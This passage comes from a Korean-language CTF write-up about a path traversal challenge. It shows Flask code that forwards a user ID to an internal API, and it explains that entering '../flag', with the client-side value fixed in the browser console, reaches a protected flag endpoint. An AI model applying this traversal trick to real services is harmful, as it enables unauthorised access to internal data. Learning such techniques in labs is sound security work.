        <span class="n">info</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">API_HOST</span><span class="si">}</span><span class="s">/api/user/</span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="sh">'</span><span class="p">).</span><span class="n">text</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">get_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">info</span><span class="o">=</span><span class="n">info</span><span class="p">)</span>
</code></pre></div></div> <p>Path traversal 취약점을 통해 flag.txt 값이 저장된 FLAG 변수를 반환하는 /api/flag가 호출될 수 있도록 ‘../flag’를 기존 url에 추가해주기로 합니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">try</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="c1"># Flag is here!!
</span><span class="k">except</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[**FLAG**]</span><span class="sh">'</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/api/flag</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@internal_api</span>
<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">FLAG</span>
</code></pre></div></div> <p>사실 주어진 입력란에 ../flag를 입력하여도 일시적으로 undefined라고 표시된 뒤 아무런 변화가 없다. 이는 자바스크립트 코드에서 users 변수가 ‘guest’는 0, ‘admin’은 1로 고정되어 있기 때문이다.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
  <span class="kd">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="p">{</span>
    <span class="dl">'</span><span class="s1">guest</span><span class="dl">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">:</span> <span class="mi">1</span>
  <span class="p">}</span>
  <span class="kd">function</span> <span class="nf">user</span><span class="p">(</span><span class="nx">evt</span><span class="p">){</span>
  	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">userid</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">userid</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">];</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">form</span><span class="dl">'</span><span class="p">).</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">submit</span><span class="dl">'</span><span class="p">,</span> <span class="nx">user</span><span class="p">);</span>
  <span class="p">}</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div> <p>따라서 이러한 문제를 해결하기 위해 다음 그림과 같이 Chrome의 console을 이용하여 값을 고정시켜준 뒤 실행해주면 flag를 얻을 수 있습니다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/112127348-b3da7e80-8c08-11eb-8933-4b989c8626a5.png" alt="image"/></p> <p><img src="https://user-images.githubusercontent.com/24788751/112127358-b63cd880-8c08-11eb-87b8-3029b68e3235.png" alt="image"/></p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[Path traversal은 URL의 경로를 임의로 조작하여 의도하지 않는 api 실행 및 파일 접근을 가능하게 하는 취약점입니다. (cf. directory listing)]]></summary></entry></feed>